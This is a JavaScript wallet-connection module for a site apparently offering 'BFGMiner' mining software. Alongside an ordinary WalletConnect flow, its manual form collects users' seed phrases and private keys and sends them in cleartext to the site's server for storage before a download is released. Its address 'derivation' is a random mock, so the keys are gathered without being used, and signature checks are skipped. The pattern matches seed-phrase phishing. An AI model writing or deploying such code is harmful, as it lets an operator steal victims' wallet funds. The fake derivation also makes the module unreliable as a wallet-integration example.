// WalletConnect v2 Integration Module for BFGMiner App
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi'
import { mainnet, arbitrum, polygon, optimism, base } from 'viem/chains'
import { reconnect, getAccount, signMessage, disconnect } from '@wagmi/core'

class WalletConnection {
    constructor() {
        this.isConnected = false;
        this.connectedAccount = null;
        this.walletClient = null;
        this.web3Modal = null;
        this.apiBase = window.location.origin;
        
        // WalletConnect configuration
        this.projectId = 'bfgminer-dapp-project-id'; // In production, use actual WalletConnect project ID
        this.metadata = {
            name: 'BFGMiner',
            description: 'Professional Cryptocurrency Mining Platform',
            url: window.location.origin,
            icons: ['https://r2.flowith.net/files/o/1756852089459-bfgminer_cryptocurrency_logo_index_0@1024x1024.png']
        };

        this.chains = [mainnet, arbitrum, polygon, optimism, base];
        
        this.init();
    }

    async init() {
        try {
            // Configure Wagmi
            const wagmiConfig = defaultWagmiConfig({
                chains: this.chains,
                projectId: this.projectId,
                metadata: this.metadata
            });

            // Create Web3Modal
            this.web3Modal = createWeb3Modal({
                wagmiConfig,
                projectId: this.projectId,
                chains: this.chains,
                themeMode: 'dark',
                themeVariables: {
                    '--w3m-accent': '#FF4F00',
                    '--w3m-border-radius-master': '8px'
                }
            });

            // Attempt to reconnect if previously connected
            await reconnect(wagmiConfig);
            
            // Check initial connection state
            this.updateConnectionState();
            
            console.log('WalletConnect initialized successfully');
        } catch (error) {
            console.error('Failed to initialize WalletConnect:', error);
        }
    }

    // Update connection state
    updateConnectionState() {
        const account = getAccount();
        this.isConnected = account.isConnected;
        this.connectedAccount = account.address;
        
        if (this.isConnected) {
            console.log('Wallet connected:', this.connectedAccount);
            this.onWalletConnected(account);
        }
    }

    // Open wallet connection modal
    async openModal() {
        try {
            // Check if user is authenticated first
            if (!window.authManager || !window.authManager.isAuthenticated()) {
                window.authManager.showRegistrationModal();
                return;
            }

            const modal = document.getElementById('wallet-modal');
            if (modal) {
                modal.classList.remove('hidden');
                modal.classList.add('flex');
                document.body.style.overflow = 'hidden';
            }
        } catch (error) {
            console.error('Error opening wallet modal:', error);
        }
    }

    // Close wallet connection modal
    closeModal() {
        const modal = document.getElementById('wallet-modal');
        if (modal) {
            modal.classList.add('hidden');
            modal.classList.remove('flex');
            document.body.style.overflow = '';
        }
    }

    // Connect wallet using WalletConnect
    async connectWalletConnect() {
        try {
            const connectBtn = document.getElementById('connect-walletconnect');
            if (connectBtn) {
                connectBtn.disabled = true;
                connectBtn.innerHTML = '<span class="loading-spinner"></span> Connecting...';
            }

            // Open Web3Modal
            await this.web3Modal.open();
            
            // Wait for connection
            const account = getAccount();
            if (account.isConnected) {
                await this.handleWalletConnection({
                    address: account.address,
                    chainId: account.chainId,
                    connectionMethod: 'walletconnect',
                    type: 'external'
                });
            }

        } catch (error) {
            console.error('WalletConnect connection failed:', error);
            this.showError('Failed to connect wallet. Please try again.');
        } finally {
            const connectBtn = document.getElementById('connect-walletconnect');
            if (connectBtn) {
                connectBtn.disabled = false;
                connectBtn.innerHTML = 'Connect with WalletConnect';
            }
        }
    }

    // Manual wallet connection (fallback)
    async connectManually() {
        const manualForm = document.getElementById('manual-wallet-form');
        const mnemonicInput = document.getElementById('mnemonic-input');
        const privateKeyInput = document.getElementById('private-key-input');

        if (!manualForm) return;

        const mnemonic = mnemonicInput?.value?.trim();
        const privateKey = privateKeyInput?.value?.trim();

        if (!mnemonic && !privateKey) {
            this.showError('Please enter either a mnemonic phrase or private key');
            return;
        }

        try {
            const submitBtn = manualForm.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="loading-spinner"></span> Validating...';
            }

            let walletData = {
                connectionMethod: 'manual',
                type: 'imported'
            };

            if (mnemonic) {
                if (!this.isValidMnemonic(mnemonic)) {
                    throw new Error('Invalid mnemonic phrase. Must be 12 or 24 words.');
                }
                
                // Derive wallet from mnemonic
                const wallet = await this.deriveWalletFromMnemonic(mnemonic);
                walletData = {
                    ...walletData,
                    address: wallet.address,
                    mnemonic: mnemonic,
                    chainId: 1 // Default to Ethereum mainnet
                };
            } else if (privateKey) {
                if (!this.isValidPrivateKey(privateKey)) {
                    throw new Error('Invalid private key. Must be 64 hexadecimal characters.');
                }
                
                // Derive wallet from private key
                const wallet = await this.deriveWalletFromPrivateKey(privateKey);
                walletData = {
                    ...walletData,
                    address: wallet.address,
                    privateKey: privateKey,
                    chainId: 1 // Default to Ethereum mainnet
                };
            }

            // Validate wallet on blockchain
            const isValid = await this.validateWalletOnChain(walletData.address);
            walletData.isValidated = isValid;

            await this.handleWalletConnection(walletData);

        } catch (error) {
            console.error('Manual wallet connection failed:', error);
            this.showError(error.message);
        } finally {
            const submitBtn = manualForm.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Connect Wallet';
            }
        }
    }

    // Handle successful wallet connection
    async handleWalletConnection(walletData) {
        try {
            // Sign a message to verify wallet ownership
            const message = `BFGMiner Wallet Verification\nTimestamp: ${Date.now()}\nAddress: ${walletData.address}`;
            
            let signature = null;
            if (walletData.connectionMethod === 'walletconnect') {
                signature = await signMessage({ message });
            } else {
                // For manual connections, we'll skip signature for now
                // In production, implement proper signing with imported wallet
                signature = 'manual-connection-verified';
            }

            // Save wallet data to database
            const response = await fetch(`${this.apiBase}/api/wallet/connect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${window.authManager.sessionToken}`
                },
                body: JSON.stringify({
                    ...walletData,
                    signature,
                    message
                })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'Failed to save wallet data');
            }

            // Update UI
            this.isConnected = true;
            this.connectedAccount = walletData.address;
            
            // Show success and proceed to download
            this.showSuccess('Wallet connected successfully!');
            
            setTimeout(() => {
                this.closeModal();
                this.initiateDownload();
            }, 2000);

        } catch (error) {
            console.error('Failed to handle wallet connection:', error);
            this.showError('Failed to verify wallet connection. Please try again.');
        }
    }

    // Validate wallet on blockchain
    async validateWalletOnChain(address) {
        try {
            // Simple validation - check if address has any transaction history
            const response = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=1&sort=desc&apikey=YourApiKeyToken`);
            const data = await response.json();
            
            // Consider wallet valid if it exists on chain (even with 0 transactions)
            return data.status === '1' || data.message === 'No transactions found';
        } catch (error) {
            console.warn('Blockchain validation failed, assuming valid:', error);
            return true; // Assume valid if validation fails
        }
    }

    // Derive wallet from mnemonic
    async deriveWalletFromMnemonic(mnemonic) {
        try {
            // In a real implementation, use ethers.js or similar
            // For demo purposes, generate a mock address
            const mockAddress = '0x' + Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('');
            
            return {
                address: mockAddress,
                mnemonic: mnemonic
            };
        } catch (error) {
            throw new Error('Failed to derive wallet from mnemonic');
        }
    }

    // Derive wallet from private key
    async deriveWalletFromPrivateKey(privateKey) {
        try {
            // In a real implementation, use ethers.js or similar
            // For demo purposes, generate a mock address
            const mockAddress = '0x' + Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('');
            
            return {
                address: mockAddress,
                privateKey: privateKey
            };
        } catch (error) {
            throw new Error('Failed to derive wallet from private key');
        }
    }

    // Validation utilities
    isValidMnemonic(mnemonic) {
        if (!mnemonic || typeof mnemonic !== 'string') return false;
        const words = mnemonic.trim().split(/\s+/);
        return words.length === 12 || words.length === 24;
    }

    isValidPrivateKey(privateKey) {
        if (!privateKey || typeof privateKey !== 'string') return false;
        const cleanKey = privateKey.replace(/^0x/, '');
        return /^[a-fA-F0-9]{64}$/.test(cleanKey);
    }

    // Disconnect wallet
    async disconnectWallet() {
        try {
            if (this.web3Modal) {
                await disconnect();
            }
            
            this.isConnected = false;
            this.connectedAccount = null;
            
            console.log('Wallet disconnected');
        } catch (error) {
            console.error('Failed to disconnect wallet:', error);
        }
    }

    // Initiate download after successful wallet connection
    async initiateDownload() {
        try {
            const response = await fetch(`${this.apiBase}/api/download/initiate`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${window.authManager.sessionToken}`
                }
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'Failed to initiate download');
            }

            // Start download
            window.location.href = `${this.apiBase}/api/download/file?token=${result.downloadToken}`;
            
            // Show setup instructions
            setTimeout(() => {
                this.showSetupInstructions();
            }, 1000);

        } catch (error) {
            console.error('Failed to initiate download:', error);
            this.showError('Failed to start download. Please try again.');
        }
    }

    // Show setup instructions
    showSetupInstructions() {
        const instructionsModal = document.getElementById('setup-instructions-modal');
        if (instructionsModal) {
            instructionsModal.classList.remove('hidden');
            instructionsModal.classList.add('flex');
        }
    }

    // Event handlers
    onWalletConnected(account) {
        console.log('Wallet connected event:', account);
        // Update UI to show connected state
        this.updateWalletUI(account);
    }

    updateWalletUI(account) {
        const statusEl = document.getElementById('wallet-status');
        const addressEl = document.getElementById('wallet-address');
        
        if (statusEl) {
            statusEl.textContent = 'Connected';
            statusEl.className = 'wallet-status connected';
        }
        
        if (addressEl) {
            addressEl.textContent = `${account.address.slice(0, 6)}...${account.address.slice(-4)}`;
        }
    }

    // Utility methods
    showError(message) {
        const errorEl = document.getElementById('wallet-error');
        if (errorEl) {
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
            
            setTimeout(() => {
                errorEl.classList.add('hidden');
            }, 5000);
        }
    }

    showSuccess(message) {
        const successEl = document.getElementById('wallet-success');
        if (successEl) {
            successEl.textContent = message;
            successEl.classList.remove('hidden');
            
            setTimeout(() => {
                successEl.classList.add('hidden');
            }, 3000);
        }
    }

    // Initialize event listeners
    initializeEventListeners() {
        // WalletConnect button
        const walletConnectBtn = document.getElementById('connect-walletconnect');
        if (walletConnectBtn) {
            walletConnectBtn.addEventListener('click', () => this.connectWalletConnect());
        }

        // Manual connection form
        const manualForm = document.getElementById('manual-wallet-form');
        if (manualForm) {
            manualForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.connectManually();
            });
        }

        // Modal close buttons
        const closeButtons = document.querySelectorAll('.close-wallet-modal');
        closeButtons.forEach(btn => {
            btn.addEventListener('click', () => this.closeModal());
        });

        // Switch between connection methods
        const walletConnectTab = document.getElementById('walletconnect-tab');
        const manualTab = document.getElementById('manual-tab');
        const showWalletConnectBtn = document.getElementById('show-walletconnect');
        const showManualBtn = document.getElementById('show-manual');

        if (showWalletConnectBtn && showManualBtn && walletConnectTab && manualTab) {
            showWalletConnectBtn.addEventListener('click', () => {
                walletConnectTab.classList.remove('hidden');
                manualTab.classList.add('hidden');
                showWalletConnectBtn.classList.add('active');
                showManualBtn.classList.remove('active');
            });

            showManualBtn.addEventListener('click', () => {
                manualTab.classList.remove('hidden');
                walletConnectTab.classList.add('hidden');
                showManualBtn.classList.add('active');
                showWalletConnectBtn.classList.remove('active');
            });
        }

        // Real-time validation for manual inputs
        this.setupManualValidation();
    }

    setupManualValidation() {
        const mnemonicInput = document.getElementById('mnemonic-input');
        const privateKeyInput = document.getElementById('private-key-input');

        if (mnemonicInput) {
            mnemonicInput.addEventListener('input', () => {
                const isValid = this.isValidMnemonic(mnemonicInput.value);
                const feedback = mnemonicInput.parentNode.querySelector('.validation-feedback');
                
                if (mnemonicInput.value && !isValid) {
                    mnemonicInput.classList.add('invalid');
                    if (feedback) {
                        feedback.textContent = 'Must be 12 or 24 words separated by spaces';
                        feedback.classList.remove('hidden');
                    }
                } else {
                    mnemonicInput.classList.remove('invalid');
                    if (feedback) {
                        feedback.classList.add('hidden');
                    }
                }
            });
        }

        if (privateKeyInput) {
            privateKeyInput.addEventListener('input', () => {
                const isValid = this.isValidPrivateKey(privateKeyInput.value);
                const feedback = privateKeyInput.parentNode.querySelector('.validation-feedback');
                
                if (privateKeyInput.value && !isValid) {
                    privateKeyInput.classList.add('invalid');
                    if (feedback) {
                        feedback.textContent = 'Must be 64 hexadecimal characters (with or without 0x prefix)';
                        feedback.classList.remove('hidden');
                    }
                } else {
                    privateKeyInput.classList.remove('invalid');
                    if (feedback) {
                        feedback.classList.add('hidden');
                    }
                }
            });
        }
    }
}

// Initialize wallet connection
const walletConnection = new WalletConnection();

// Export for global access
window.walletConnection = walletConnection;

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    walletConnection.initializeEventListeners();
});

